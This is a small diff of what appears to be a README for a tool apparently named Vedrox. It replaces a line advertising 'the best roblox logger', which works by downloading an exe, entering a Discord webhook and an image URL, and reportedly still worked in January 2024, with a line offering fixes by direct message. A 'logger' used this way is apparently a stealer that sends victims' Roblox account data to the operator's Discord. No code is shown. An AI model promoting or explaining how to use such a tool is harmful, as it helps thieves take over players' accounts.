@@ -1,2 +1,1 @@
-This is the best roblox logger there is, how it works is download exe, put in your discord webhook and image url then there should be an image sent to your discord server
-#  CURRENTLY JANUARY 4TH 2024 STILL WORKING!
+# This is a fix for most Vedrox problems, if it still doessnt work dm hold or mxdas and we will fix your problem manually by ourselves!
